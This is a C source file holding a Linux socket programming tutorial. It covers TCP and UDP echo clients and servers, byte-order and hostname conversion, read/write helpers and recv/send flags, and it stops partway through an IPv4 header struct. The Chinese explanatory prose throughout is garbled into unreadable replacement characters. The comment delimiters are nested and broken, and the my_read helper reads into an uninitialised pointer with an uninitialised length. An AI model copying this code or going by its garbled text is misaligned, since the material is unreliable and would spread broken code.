/*
(һ)Linux������--����֪ʶ����

Linux������--����֪ʶ����
�ͻ��˺ͷ���� 
        ����������ͨ�ĳ�����һ���������������������������������ɵ�--�ͻ��˺ͷ�������.

�ͻ���
        ����������У����һ����������������ĳ���ͨ�ţ���ô���ǰ���������Ϊ�ͻ��˳��� ��������ʹ��ftp���������һ
        ���ط���ȡ�ļ���ʱ�������ǵ�ftp��������ͬ�������ͨ�ţ���ȡ�ļ����� ��������ط����ǵ�ftp������ǿͻ��˳��� 
�����
        �Ϳͻ������Ӧ�ĳ���Ϊ����˳��򡣱����ĵȴ�����ĳ��������Լ�ͨѶ�ĳ����Ϊ����˳��� 
        ����������ļ���ȡ�У�����һ���ط��ĳ�����Ƿ���ˣ����Ǵӷ���˻�ȡ�ļ������� 
��Ϊ�ͻ��ͷ����
        ʵ����������Щ�����ǻ�Ϊ����Ϳͻ��ˡ������������Ŀ�� һ�������Ϊ�ͻ���Ҳ�Ƿ���ˡ�

���õ����� 
        ��������������������������,�����ڵ��Ե�ʱ��Ƚ��鷳,Ϊ�������б�Ҫ֪��һЩ���õ��������� 
netstat 
        ����netstat��������ʾ���������,·�ɱ�ͽӿ�ͳ�Ƶ��������Ϣ.netstat������ѡ��. 
        ���ǳ��õ�ѡ����-na ������ʾ��ϸ������״̬.����������ѡ�����ǿ���ʹ�ð����ֲ�����ϸ�����. 
telnet 
        telnet��һ��������¼Զ�̵ĳ���,����������ȫ����������������������ǵķ���˳����. 
        �������ǵķ����������ڼ���8888�˿�,���ǿ�����
                telnet localhost 8888
        ���鿴����˵�״��. 
pingping ���������ж������״̬�Ƿ������������һ���÷���
        ping 192.168.0.1
        ��ʾ������鿴��192.168.0.1��Ӳ�������Ƿ����� 
TCP/UDP���� 
        TCP(Transfer Control Protocol)�������Э����һ���������ӵ�Э��, �����ǵ��������ʹ�����Э���ʱ��,
        ������Ա�֤���ǵĿͻ��˺ͷ���˵������ǿɿ���,��ȫ��.

        UDP(User Datagram Protocol)�û����ݱ�Э����һ�ַ��������ӵ�Э��, 
        ����Э�鲢���ܱ�֤���ǵ��������������ǿɿ���,�����������ڱ�д�ĳ���һ���ǲ���TCPЭ���.

 */
 /*

(��)Linux������--�������纯�����ܣ�TCP��

   Linuxϵͳ��ͨ���ṩ�׽���(socket)�����������̵�.�������ͨ��socket���������������ĵ���,
   �᷵��һ�� ͨѶ���ļ�������,���ǿ��Խ����������������ͨ���ļ���������������,�����linux���豸�޹��Եĺô�.
   ���ǿ���ͨ������������д����ʵ������֮������ݽ���. 
(һ)socket 
  
  int socket(int domain, int type,int protocol)

  domain:˵����������������ڵ��������õ�ͨѶЭ��(AF_UNIX��AF_INET��). 
        AF_UNIXֻ�ܹ����ڵ�һ��Unix ϵͳ���̼�ͨ��,
        ��AF_INET�����Internet��,�������������Զ�� 
        ����֮��ͨ��(������ man socketʱ���� domain��ѡ���� PF_*������AF_*,��Ϊglibc��posix��ʵ��������PF������AF,
        �������Ƕ�����ʹ�õ�).

  type:����������������õ�ͨѶЭ��(SOCK_STREAM,SOCK_DGRAM��) 
        SOCK_STREAM���������õ���TCP Э��,�������ṩ��˳���,�ɿ�,˫��,�������ӵı�����. 
        SOCK_DGRAM ���������õ���UDPЭ��,����ֻ���ṩ������,���ɿ�,�����ӵ�ͨ��.

  protocol:��������ָ����type,��������ط�����һ��ֻҪ��0������Ϳ����� socketΪ����ͨѶ��������׼��.
  �ɹ�ʱ�����ļ�������,ʧ��ʱ����-1,��errno��֪���������ϸ���.


(��)bind 
  int bind(int sockfd, struct sockaddr *my_addr, int addrlen)

  sockfd:����socket���÷��ص��ļ�������.

  addrlen:��sockaddr�ṹ�ĳ���.

  my_addr:��һ��ָ��sockaddr��ָ��. ������ sockaddr�Ķ���

        struct sockaddr{
                unisgned short  as_family;
                char            sa_data[14];
        };

  ��������ϵͳ�ļ�����,����һ�㲻�����ͷ�ļ�,��ʹ������һ���ṹ(struct sockaddr_in) ������.������sockaddr_in�Ķ��� 
        struct sockaddr_in{
                unsigned short          sin_family;     
                unsigned short int      sin_port;
                struct in_addr          sin_addr;
                unsigned char           sin_zero[8];
        }
  ������Ҫʹ��Internet����
        sin_familyһ��ΪAF_INET,
        sin_addr����ΪINADDR_ANY��ʾ���Ժ��κε�����ͨ��,
        sin_port������Ҫ�����Ķ˿ں�.sin_zero[8]����������. 
  bind�����صĶ˿�ͬsocket���ص��ļ�������������һ��.�ɹ��Ƿ���0,ʧ�ܵ������socketһ��

(��)listen 
  int listen(int sockfd,int backlog)

  sockfd:��bind����ļ�������.

  backlog:���������Ŷӵ���󳤶�.���ж���ͻ��˳���ͷ��������ʱ, ʹ�������ʾ���Խ��ܵ��Ŷӳ���. 
  listen������bind���ļ���������Ϊ�����׽���.���ص������bindһ��.


(��)accept 
  int accept(int sockfd, struct sockaddr *addr,int *addrlen)

  sockfd:��listen����ļ�������.

  addr,addrlen���������ͻ��˵ĳ�����д��,��������ֻҪ����ָ��Ϳ�����. bind,listen��accept�Ƿ��������õĺ���,
  accept����ʱ,�������˵ĳ����һֱ��������һ�� �ͻ����򷢳�������. accept�ɹ�ʱ�������ķ������˵��ļ�������,
  ���ʱ��������˿������������д��Ϣ��. ʧ��ʱ����-1

(��)connect 
   int connect(int sockfd, struct sockaddr * serv_addr,int addrlen)

   sockfd:socket���ص��ļ�������.

   serv_addr:�����˷������˵�������Ϣ.����sin_add�Ƿ���˵ĵ�ַ

   addrlen:serv_addr�ĳ���

   connect�����ǿͻ�������ͬ��������ӵ�.�ɹ�ʱ����0,sockfd��ͬ�����ͨѶ���ļ������� ʧ��ʱ����-1.

(��)ʵ��

�������˳���

CODE:  [Copy to clipboard]


--------------------------------------------------------------------------------

/******* ����������  (server.c) ************/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{
        int sockfd,new_fd;
        struct sockaddr_in server_addr;
        struct sockaddr_in client_addr;
        int sin_size,portnumber;
        char hello[]="Hello! Are You Fine?\n";

        if(argc!=2)
        {
                fprintf(stderr,"Usage:%s portnumber\a\n",argv[0]);
                exit(1);
        }

        if((portnumber=atoi(argv[1]))<0)
        {
                fprintf(stderr,"Usage:%s portnumber\a\n",argv[0]);
                exit(1);
        }

        /* �������˿�ʼ����socket������ */
        if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)  
        {
                fprintf(stderr,"Socket error:%s\n\a",strerror(errno));
                exit(1);
        }

        /* ����������� sockaddr�ṹ  */ 
        bzero(&server_addr,sizeof(struct sockaddr_in));
        server_addr.sin_family=AF_INET;
        server_addr.sin_addr.s_addr=htonl(INADDR_ANY);
        server_addr.sin_port=htons(portnumber);

        /* ����sockfd������  */ 
        if(bind(sockfd,(struct sockaddr *)(&server_addr),sizeof(struct sockaddr))==-1)
        {
                fprintf(stderr,"Bind error:%s\n\a",strerror(errno));
                exit(1);
        }

        /* ����sockfd������  */
        if(listen(sockfd,5)==-1)
        {
                fprintf(stderr,"Listen error:%s\n\a",strerror(errno));
                exit(1);
        }

        while(1)
        {
                /* ����������,ֱ���ͻ�����������  */
                sin_size=sizeof(struct sockaddr_in);
                if((new_fd=accept(sockfd,(struct sockaddr *)(&client_addr),&sin_size))==-1)
                {
                        fprintf(stderr,"Accept error:%s\n\a",strerror(errno));
                        exit(1);
                }

                fprintf(stderr,"Server get connection from %s\n",
                inet_ntoa(client_addr.sin_addr));
                if(write(new_fd,hello,strlen(hello))==-1)
                {
                        fprintf(stderr,"Write Error:%s\n",strerror(errno));
                        exit(1);
                }
                /* ���ͨѶ�Ѿ�����     */
                close(new_fd);
                /* ѭ����һ��     */  
        }
        close(sockfd);
        exit(0);
}

/******* �ͻ��˳���  client.c ************/
/******* �ͻ��˳���  client.c ************/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{
        int sockfd;
        char buffer[1024];
        struct sockaddr_in server_addr;
        struct hostent *host;
        int portnumber,nbytes;

        if(argc!=3)
        {
                fprintf(stderr,"Usage:%s hostname portnumber\a\n",argv[0]);
                exit(1);
        }

        if((host=gethostbyname(argv[1]))==NULL)
        {
                fprintf(stderr,"Gethostname error\n");
                exit(1);
        }

        if((portnumber=atoi(argv[2]))<0)
        {
                fprintf(stderr,"Usage:%s hostname portnumber\a\n",argv[0]);
                exit(1);
        }

        /* �ͻ�����ʼ���� sockfd������  */
        if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)
        {
                fprintf(stderr,"Socket Error:%s\a\n",strerror(errno));
                exit(1);
        }

        /* �ͻ�����������˵�����       */
        bzero(&server_addr,sizeof(server_addr));
        server_addr.sin_family=AF_INET;
        server_addr.sin_port=htons(portnumber);
        server_addr.sin_addr=*((struct in_addr *)host->h_addr);

        /* �ͻ���������������         */ 
        if(connect(sockfd,(struct sockaddr *)(&server_addr),sizeof(struct sockaddr))==-1)
        {
                fprintf(stderr,"Connect Error:%s\a\n",strerror(errno));
                exit(1);
        }

        /* ���ӳɹ���           */
        if((nbytes=read(sockfd,buffer,1024))==-1)
        {
                fprintf(stderr,"Read Error:%s\n",strerror(errno));
                exit(1);
        }
        buffer[nbytes]='\0';
        printf("I have received:%s\n",buffer);
        /* ����ͨѶ     */
        close(sockfd);
        exit(0);
}

/*
MakeFile
��������ʹ��GNU ��makeʵ�ó���������. ����make����ϸ˵���� Make ʹ�ý���

CODE:  [Copy to clipboard]

#########  Makefile       ###########
all:server client
server:server.c
        gcc $^ -o $@
client:client.c
        gcc $^ -o $@

����make��������������server(��������)��client(�ͻ���) ������./server portnumber&  
        (portnumber���ȡһ������1204�Ҳ���/etc/services�г��ֵĺ��� ����8888����),
        Ȼ������  ./client localhost 8888 ������ʲô���. (��Ҳ������telnet��netstat��һ��.) 
        ������һ����򵥵��������,�����ǲ���Ҳ�е㷳.��������ຯ�����ǻ�û�н���. �һ�����һ�½��е���ϸ��˵��.


(��) �ܽ� 
�ܵ���˵���������������������ɵ�--�ͻ��˺ͷ�������.���ǵĽ�������һ����:

��������
socket-->bind-->listen-->accept

�ͻ���
socket-->connect

(��)Linux������--3. �������Ϳͻ�������Ϣ����


��һ��������ѧϰת�������緽�����Ϣ����. 
3.1 �ֽ�ת������ 
��������������������͵Ļ���,��Щ�����ڱ�ʾ���ݵ��ֽ�˳���ǲ�ͬ��, ����i386оƬ�ǵ��ֽ����ڴ��ַ�ĵͶ�,
���ֽ��ڸ߶�,��alphaоƬȴ�෴. Ϊ��ͳһ����,��Linux����,��ר�ŵ��ֽ�ת������. 
unsigned long  int htonl(unsigned long  int hostlong)
unsigned short int htons(unisgned short int hostshort)
unsigned long  int ntohl(unsigned long  int netlong)
unsigned short int ntohs(unsigned short int netshort)

�����ĸ�ת��������,h ����host, n ���� network.s ����short l ����long 
        ��һ�������������ǽ��������ϵ�long����ת��Ϊ�����ϵ�long. ������������������Ҳ���.

3.2 IP��������ת�� 
�������ϱ�־һ̨����������IP������������.��ô������ôȥ����ת����?

struct hostent *gethostbyname(const char *hostname)
struct hostent *gethostbyaddr(const char *addr,int len,int type)
������struct hostent�Ķ���
struct hostent{
        char *h_name;           /* ��������ʽ����  */
        char *h_aliases;        /* �����ı��� */
        int   h_addrtype;       /* �����ĵ�ַ����  AF_INET*/
        int   h_length;         /* �����ĵ�ַ����  ����IP4 ��4�ֽ�32λ*/
        char **h_addr_list;     /* ������IP��ַ�б� */
        }
  #define h_addr h_addr_list[0]  /* �����ĵ�һ��IP��ַ*/
/*
gethostbyname���Խ�������(�� linux.yessun.com)ת��Ϊһ���ṹָ��.������ṹ���洢������������Ϣ 
gethostbyaddr���Խ�һ��32λ��IP��ַ(C0A80001)ת��Ϊ�ṹָ��.

����������ʧ��ʱ����NULL ������h_errno�������,����h_strerror()���Եõ���ϸ�ĳ�����Ϣ


3.3 �ַ�����IP��32λ��IPת��. 
���������������õ�IP�������ּӵ�(192.168.0.1)���ɵ�, ����struct in_addr�ṹ���õ���32λ��IP, 
���������Ǹ�32λIP(C0A80001)�ǵ�192.168.0.1 Ϊ��ת�����ǿ���ʹ��������������

int inet_aton(const char *cp,struct in_addr *inp)
char *inet_ntoa(struct in_addr in)

�������� a ���� ascii n ����network.��һ��������ʾ��a.b.c.d��IPת��Ϊ32λ��IP,
�洢�� inpָ������.�ڶ����ǽ�32λIPת��Ϊa.b.c.d�ĸ�ʽ.


3.4 ������Ϣ���� 
�������������������ʱ����Ҫ֪���˿�.IP�ͷ�����Ϣ.���ʱ�����ǿ���ʹ�����¼�������

int getsockname(int sockfd,struct sockaddr *localaddr,int *addrlen)
int getpeername(int sockfd,struct sockaddr *peeraddr, int *addrlen)
struct servent *getservbyname(const char *servname,const char *protoname)
struct servent *getservbyport(int port,const char *protoname)
struct servent
        {
                char *s_name;          /* ��ʽ������ */
                char **s_aliases;      /* �����б� */  
                int s_port;            /* �˿ں� */
                char *s_proto;         /* ʹ�õ�Э�� */ 
        }
/*
һ�����Ǻ������⼸������.��Ӧ�ͻ���,������Ҫ�õ����ӵĶ˿ں�ʱ��connect���óɹ���ʹ�ÿɵõ� 
ϵͳ����Ķ˿ں�.���ڷ����,������INADDR_ANY����,Ϊ�˵õ����ӵ�IP���ǿ�����accept���óɹ��� ʹ�ö��õ�IP��ַ. 
��������������Ĭ�϶˿ںͷ���,����˿�21��ftp80��ӦWWW.Ϊ�˵õ�ָ���Ķ˿ںŵķ��� ���ǿ��Ե��õ��ĸ�����,
�෴Ϊ�˵õ��˿ںſ��Ե��õ���������.

3.5 һ������

CODE:  [Copy to clipboard]
*/
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>

int main(int argc ,char **argv)
{
        struct sockaddr_in addr;
        struct hostent *host;
        char **alias;
        
        if(argc<2)
        {
         fprintf(stderr,"Usage:%s hostname|ip..\n\a",argv[0]);
         exit(1);
        }
        
        argv++;
        for(;*argv!=NULL;argv++)
        {
                /* �������Ǽ�����IP*/   
                if(inet_aton(*argv,&addr.sin_addr)!=0)
                {
                   host=gethostbyaddr((char   *)&addr.sin_addr,4,AF_INET); 
                   printf("Address information of Ip %s\n",*argv); 
                } 
                else 
                {
                      /* ʧ��,�ѵ�������?*/
                      host=gethostbyname(*argv); printf("Address information
                      of host %s\n",*argv); 
                }
                if(host==NULL)
                {
                        /* ������ ,���˲�����*/
                        fprintf(stderr,"No address information of %s\n",*argv);
                        continue;
                }
                printf("Official host name %s\n",host->h_name);
                printf("Name aliases:");
                for(alias=host->h_aliases;*alias!=NULL;alias++)
                 printf("%s ,",*alias);
                printf("\nIp address:");
                for(alias=host->h_addr_list;*alias!=NULL;alias++)
                  printf("%s ,",inet_ntoa(*(struct in_addr *)(*alias)));
        }
}
/*
�������������,Ϊ���ж��û��������IP�����������ǵ�������������,��һ�����Ǽ����������IP���Ե���inet_aton, 
ʧ�ܵ�ʱ��,�ٵ���gethostbyname���õ���Ϣ.

(��)Linux������--4. �����Ķ�д����

һ�����ǽ���������,���ǵ���һ�����ǽ���ͨ����.��Linux���������ǰ�潨����ͨ���������ļ�������,
�����������˺Ϳͻ��˽���ͨ��ʱ��,ֻҪ���ļ������������д������. �����������ļ���дһ��.

4.1 д����write 
ssize_t write(int fd,const void *buf,size_t nbytes)

write������buf�е�nbytes�ֽ�����д���ļ�������fd.�ɹ�ʱ����д���ֽ���.ʧ��ʱ����-1. ������errno����. 
�����������,���������׽����ļ�������дʱ�����ֿ���.

        1)write�ķ���ֵ����0,��ʾд�˲��ֻ�����ȫ��������.

        2)���ص�ֵС��0,��ʱ�����˴���.����Ҫ���ݴ�������������.

�������ΪEINTR��ʾ��д��ʱ��������жϴ���. 
���ΪEPIPE��ʾ�������ӳ���������(�Է��Ѿ��ر�������). 
Ϊ�˴������ϵ����,�����Լ���дһ��д�����������⼸�����.
*/
int my_write(int fd,void *buffer,int length)
{
int bytes_left;
int written_bytes;
char *ptr;

ptr=buffer;
bytes_left=length;
while(bytes_left>0)
{
        /* ��ʼд*/
        written_bytes=write(fd,ptr,bytes_left);
        if(written_bytes<=0) /* ������*/
        {       
                if(errno==EINTR) /* �жϴ��� ���Ǽ���д*/
                        written_bytes=0;
                else             /* �������� û�а취,ֻ�ó�����*/
                        return(-1);
        }
        bytes_left-=written_bytes;
        ptr+=written_bytes;     /* ��ʣ�µĵط�����д  */
}
return(0);
}
/*
4.2 ������read 
ssize_t read(int fd,void *buf,size_t nbyte) read�����Ǹ����fd�ж�ȡ����.�����ɹ�ʱ, 
read����ʵ���������ֽ���,������ص�ֵ��0 ��ʾ�Ѿ������ļ��Ľ�����,С��0��ʾ�����˴���.
        �������ΪEINTR˵���������ж������, 
        �����ECONNREST��ʾ�������ӳ�������. ������һ��,����Ҳдһ���Լ��Ķ�����.

int my_read(int fd,void *buffer,int length)
{
int bytes_left;
int bytes_read;
char *ptr;
  
bytes_left=length;
while(bytes_left>0)
{
   bytes_read=read(fd,ptr,bytes_read);
   if(bytes_read<0)
   {
     if(errno==EINTR)
        bytes_read=0;
     else
        return(-1);
   }
   else if(bytes_read==0)
       break;
    bytes_left-=bytes_read;
    ptr+=bytes_read;
}
return(length-bytes_left);
}


4.3 ���ݵĴ��� 
�����������������,���ǾͿ�����ͻ��˻����Ƿ���˴���������.��������Ҫ����һ���ṹ.����ʹ�����·�ʽ


/*  �ͻ���������д */
/*
struct my_struct my_struct_client;
write(fd,(void *)&my_struct_client,sizeof(struct my_struct);

/* ����˵Ķ�*/ 
/*
char buffer[sizeof(struct my_struct)];
struct *my_struct_server;
read(fd,(void *)buffer,sizeof(struct my_struct)); 
my_struct_server=(struct my_struct *)buffer;   

�������ϴ�������ʱ����һ�㶼�ǰ�����ת��Ϊchar���͵����ݴ���.���յ�ʱ��Ҳ��һ���� ע���������û�б�Ҫ�������ϴ�
��ָ��(��Ϊ����ָ����û���κ������,���Ǳ��봫��ָ����ָ�������)


(��)Linux������--5. �û����ݱ�����


����ǰ���Ѿ�ѧϰ��������һ���ܴ�Ĳ���,��������ֵ�֪ʶ,����ʵ���Ͽ���д���󲿷ֵĻ���TCPЭ������������.
������ Linux�µĴ󲿷ֳ�����������������ѧ��֪ʶ��д��.���ǿ���ȥ��һЩԴ�������ο�һ��.��һ��,���Ǽ򵥵�ѧϰһ
�»���UDPЭ����������.

5.1 �������õĺ��� 
   int recvfrom(int sockfd,void *buf,int len,unsigned int flags,struct sockaddr * from int *fromlen)
   int sendto(int sockfd,const void *msg,int len,unsigned int flags,struct sockaddr *to int tolen)

sockfd,buf,len�������read,writeһ��,�ֱ��ʾ�׽���������,���ͻ���յĻ���������С.
recvfrom����� sockfd��������,���from����NULL,��ô��from����洢����Ϣ��Դ�����,�������Ϣ����Դ������Ȥ,
���Խ�from��fromlen ����ΪNULL.sendto������to������Ϣ.��ʱ��to����洢������Ϣ������ϸ����.


5.2 һ��ʵ��

CODE:  [Copy to clipboard]


--------------------------------------------------------------------------------

/*           ����˳���  server.c           */
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#define SERVER_PORT     8888
#define MAX_MSG_SIZE    1024

void udps_respon(int sockfd)
{
        struct sockaddr_in addr;
        int    n;
                socklen_t addrlen;
        char    msg[MAX_MSG_SIZE];
        
        while(1)
        {       /* �������϶�,д����������ȥ   */
                                memset(msg, 0, sizeof(msg));
                                addrlen = sizeof(struct sockaddr);
                                n=recvfrom(sockfd,msg,MAX_MSG_SIZE,0,
                        (struct sockaddr*)&addr,&addrlen);
                /* ��ʾ������Ѿ��յ�����Ϣ  */
                fprintf(stdout,"I have received %s",msg);
                sendto(sockfd,msg,n,0,(struct sockaddr*)&addr,addrlen);
        }
}

int main(void)
{
        int sockfd;
        struct sockaddr_in      addr;
        
        sockfd=socket(AF_INET,SOCK_DGRAM,0);
        if(sockfd<0)
        {
                fprintf(stderr,"Socket Error:%s\n",strerror(errno));
                exit(1);
        }
        bzero(&addr,sizeof(struct sockaddr_in));
        addr.sin_family=AF_INET;
        addr.sin_addr.s_addr=htonl(INADDR_ANY);
        addr.sin_port=htons(SERVER_PORT);
        if(bind(sockfd,(struct sockaddr *)&addr,sizeof(struct sockaddr_in))<0)
        {
                fprintf(stderr,"Bind Error:%s\n",strerror(errno));
                exit(1);
        }
        udps_respon(sockfd);
        close(sockfd);
}



/*          �ͻ��˳���             */
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#define MAX_BUF_SIZE    1024

void udpc_requ(int sockfd,const struct sockaddr_in *addr,socklen_t len)
{
        char buffer[MAX_BUF_SIZE];
        int n;
        while(fgets(buffer,MAX_BUF_SIZE,stdin))        
        {        /*   �Ӽ��̶���,д�������   */
                sendto(sockfd,buffer,strlen(buffer),0,addr,len);
                bzero(buffer,MAX_BUF_SIZE);

                /*   �������϶�,д����Ļ��    */
                                memset(buffer, 0, sizeof(buffer));
                n=recvfrom(sockfd,buffer,MAX_BUF_SIZE, 0, NULL, NULL);
                if(n <= 0)
                                {
                                        fprintf(stderr, "Recv Error %s\n", strerror(errno));
                                        return;
                                }
                                buffer[n]=0;
                fprintf(stderr, "get %s", buffer);
        }
}


int main(int argc,char **argv)
{
        int sockfd,port;
        struct sockaddr_in      addr;
        
        if(argc!=3)
        {
                fprintf(stderr,"Usage:%s server_ip server_port\n",argv[0]);
                exit(1);
        }
        
        if((port=atoi(argv[2]))<0)
        {
                fprintf(stderr,"Usage:%s server_ip server_port\n",argv[0]);
                exit(1);
        }
        
        sockfd=socket(AF_INET,SOCK_DGRAM,0);
        if(sockfd<0)
        {
                fprintf(stderr,"Socket  Error:%s\n",strerror(errno));
                exit(1);
        }       
        /*      ������˵�����      */
        bzero(&addr,sizeof(struct sockaddr_in));
        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);
        if(inet_aton(argv[1],&addr.sin_addr)<0)
        {
                fprintf(stderr,"Ip error:%s\n",strerror(errno));
                exit(1);
        }
                 if(connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
                {
                        fprintf(stderr, "connect error %s\n", strerror(errno));
                        exit(1);
                }
        udpc_requ(sockfd,&addr,sizeof(struct sockaddr_in));
        close(sockfd);
}
/*
########### �����ļ� Makefile        ##########
all:server client
server:server.c
        gcc -o server server.c
client:client.c
        gcc -o client client.c
clean:
        rm -f server
        rm -f client
        rm -f core

����UDP Server����
ִ��./server &��������������������ǿ���ʹ��netstat -ln�������۲�������󶨵�IP��ַ�Ͷ˿ڣ����������Ϣ���£�
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State
tcp 0 0 0.0.0.0:32768 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN
tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN
tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN
udp 0 0 0.0.0.0:32768 0.0.0.0:*
udp 0 0 0.0.0.0:8888 0.0.0.0:*
udp 0 0 0.0.0.0:111 0.0.0.0:*
udp 0 0 0.0.0.0:882 0.0.0.0:*
���Կ���udp���С�0.0.0.0:8888�������ݣ�˵����������Ѿ��������У����Խ����������κ�IP��ַ�Ҷ˿�Ϊ8888�����ݡ�

3������UDP Client����
ִ��./client 127.0.0.1 8888�����������ͻ�����ʹ��127.0.0.1�����ӷ������ִ��Ч�����£�
Hello, World!
Hello, World!
this is a test
this is a test
^d
��������ݶ���ȷ�ӷ�����򷵻��ˣ���ctrl+d���Խ������룬�˳�����

(��)Linux������--6. �߼��׽��ֺ���

��ǰ��ļ�����������,�����Ѿ�ѧ������ô���������϶�д��Ϣ��.ǰ���һЩ����(read,write)�������������������ĺ���.
Ҳ����ԭʼ��ͨ�ź���.����һ������,����һ����ѧϰ����ͨ�ŵĸ߼�����.��һ������ѧϰ���⼸����д����.

6.1 recv��send 
  recv��send�����ṩ�˺�read��write���Ĺ���.���������ṩ �˵��ĸ����������ƶ�д����.

         int recv(int sockfd,void *buf,int len,int flags)
         int send(int sockfd,void *buf,int len,int flags)

ǰ�������������read,writeһ��,���ĸ�����������0���������µ���� 
_______________________________________________________________
|  MSG_DONTROUTE        |  ������·�ɱ�                         |
|  MSG_OOB              |  ���ܻ��߷��ʹ�������                 |
|  MSG_PEEK             |  �鿴����,������ϵͳ��������������    |
|  MSG_WAITALL          |  �ȴ���������                         |
|---------------------------------------------------------------|

MSG_DONTROUTE:��send����ʹ�õı�־.�����־����IPЭ��.Ŀ�������ڱ�����������,û�б�Ҫ����·�ɱ�.
        �����־һ����������Ϻ�·�ɳ�������.

MSG_OOB:��ʾ���Խ��պͷ��ʹ��������.���ڴ������������Ժ����͵�.

MSG_PEEK:��recv������ʹ�ñ�־,��ʾֻ�Ǵ�ϵͳ�������ж�ȡ����,�������ϵͳ������������.�����´ζ���ʱ��,
        ��Ȼ��һ��������.һ�����ж�����̶�д����ʱ����ʹ�������־.

MSG_WAITALL��recv������ʹ�ñ�־,��ʾ�ȵ����е���Ϣ����ʱ�ŷ���.ʹ�������־��ʱ��recv��һֱ����,ֱ��ָ������������,�����Ƿ����˴���. 
        1)��������ָ�����ֽ�ʱ,������������.����ֵ����len 
        2)���������ļ��Ľ�βʱ,������������.����ֵС��len 
        3) ��������������ʱ,����-1,�����ô���Ϊ��Ӧ�Ĵ����(errno)

���flagsΪ0,���read,writeһ���Ĳ���.���������ļ���ѡ��,��������ʵ�����õĺ���,
���Բ鿴 Linux Programmer's Manual�õ���ϸ����.

6.2 recvfrom��sendto 
        ����������һ�����ڷ��׽��ֵ����������(UDP),�����Ѿ���ǰ��ѧ����.

6.3 recvmsg��sendmsg 
        recvmsg��sendmsg����ʵ��ǰ�����еĶ�д�����Ĺ���.

int recvmsg(int sockfd,struct msghdr *msg,int flags)
int sendmsg(int sockfd,struct msghdr *msg,int flags)

  struct msghdr
        {
                void *msg_name;
                int msg_namelen;
                struct iovec *msg_iov;
                int msg_iovlen;
                void *msg_control;
                int msg_controllen;
                int msg_flags;
        }

struct iovec
        {
                void *iov_base; /* ��������ʼ�ĵ�ַ  */
 /*               size_t iov_len;  �������ĳ���
        }

        msg_name�� msg_namelen���׽����Ƿ���������ʱ(UDP),���Ǵ洢���պͷ��ͷ��ĵ�ַ��Ϣ.
        msg_nameʵ������һ��ָ��struct sockaddr��ָ��,
        msg_namelen�ǽṹ�ĳ���.���׽�������������ʱ,������ֵӦ��ΪNULL. 
        msg_iov�� msg_iovlenָ�����ܺͷ��͵Ļ���������.msg_iov��һ���ṹָ��,msg_iovlenָ������ṹ����Ĵ�С.  
        msg_control��msg_controllen�������������������պͷ��Ϳ�������ʱ�� msg_flagsָ�����ܺͷ��͵Ĳ���ѡ��.
        �� recv,send��ѡ��һ��

6.4 �׽��ֵĹر� 
�ر��׽�������������close��shutdown.��closeʱ�����ǹر��ļ�һ��.

6.5 shutdown

int shutdown(int sockfd,int howto) 

TCP������˫���(�ǿɶ�д��),������ʹ��closeʱ,��Ѷ�дͨ�����ر�,��ʱ������ϣ��ֻ�ر�һ������,���ʱ�����ǿ���ʹ��
shutdown.��Բ�ͬ��howto,ϵͳ�ز�ȡ��ͬ�Ĺرշ�ʽ. 
        howto=0���ʱ��ϵͳ��رն�ͨ��.���ǿ��Լ���������������д. 
        howto=1�ر�дͨ��,�������෴,��ʱ���ֻ���Զ���. 
        howto=2�رն�дͨ��,��closeһ�� �ڶ���̳�������,����м����ӽ��̹���һ���׽���ʱ,�������ʹ��shutdown, 
        ��ô���е��ӽ��̶����ܹ�������,���ʱ������ֻ�ܹ�ʹ��close���ر��ӽ��̵��׽���������.


(��)Linux������--7. TCP/IPЭ��

��Ҳ����˵��TCP/IPЭ��,��ô��֪������ʲô��TCP,ʲô��IP��?����һ������,����һ����ѧϰ���Ŀǰ����������㷺��Э��.

7.1 ���紫��ֲ� 
    ����㿼��������ȼ�����,��ô���Ӧ���Ѿ�֪�������紫��ֲ��������.��������,����Ϊ�˴�������ʱ�ķ���,
    ������Ĵ����Ϊ7�����.�ֱ���:Ӧ�ò�,��ʾ��,�Ự��,�����,�����,������·��������.�ֺ��˲��Ժ�,��������ʱ,
    ��һ�����Ҫ���ݵĻ�,�Ϳ���ֱ������һ��Ҫ��,������Ҫ�����ݴ����ϸ��.��һ��Ҳֻ��������һ���ṩ����,
    ����Ҫȥ������������.����㲻�뿼��,��û�б�Ҫȥ����Щ������.ֻҪ֪���Ƿֲ��,���Ҹ�������ò�ͬ.

7.2 IPЭ�� 
    IPЭ������������Э��.����Ҫ������ݰ��ķ�������. �����������IP4�����ݰ���ʽ

0      4       8       16                      32
--------------------------------------------------
|�汾   |�ײ�����|��������|    ���ݰ��ܳ�       |
--------------------------------------------------
|    ��ʶ                 |DF |MF| ��Ƭƫ��      |
--------------------------------------------------
|   ����ʱ��    |  Э��   |  �ײ������         |
------------------------------------------------
|               ԴIP��ַ                        |
------------------------------------------------
|               Ŀ��IP��ַ                      |
-------------------------------------------------
|               ѡ��                            |
=================================================
|               ����                            |
-------------------------------------------------                      

�������ǿ�һ��IP�Ľṹ����
*/
struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
